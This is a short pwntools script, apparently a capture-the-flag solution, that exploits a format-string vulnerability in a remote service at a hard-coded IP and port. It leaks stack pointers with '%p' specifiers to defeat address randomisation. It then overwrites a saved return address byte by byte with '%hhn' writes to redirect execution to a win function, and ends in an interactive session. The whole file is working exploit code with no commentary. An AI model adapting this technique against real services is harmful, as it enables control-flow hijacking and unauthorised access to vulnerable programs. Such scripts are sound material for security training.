from pwn import *

###Util
def sendmsg(msg):
    r.sendlineafter('message : ',msg)
    return r.recvuntil('Your',drop=True,timeout=0.1)

###Addr
csu_init_offset = 0x12c0
winfunc_offset = 0x1201+1

###Exploit
r = remote('140.112.31.97',30104)

leaks = sendmsg('%14$p%12$p').split(b'0x')[1:]
csu_init_addr = int(leaks[0],16)
code_base = csu_init_addr-csu_init_offset
print(hex(code_base))
main_rsp = int(leaks[1],16)-0x120
print(hex(main_rsp))

for i in range(8):
    target = ((code_base+winfunc_offset)>>(i*8))&0xff
    if target!=0:
        sendmsg(f'%{target}c%10$hhn'.encode().ljust(0x10,b'\x00')+p64(main_rsp+0x48+i))
    else:
        sendmsg(f'%10$hhn'.encode().ljust(0x10,b'\x00')+p64(main_rsp+0x48+i))

sendmsg(f'%10$n'.encode().ljust(0x10,b'\x00')+p64(main_rsp+0xc))

r.interactive()
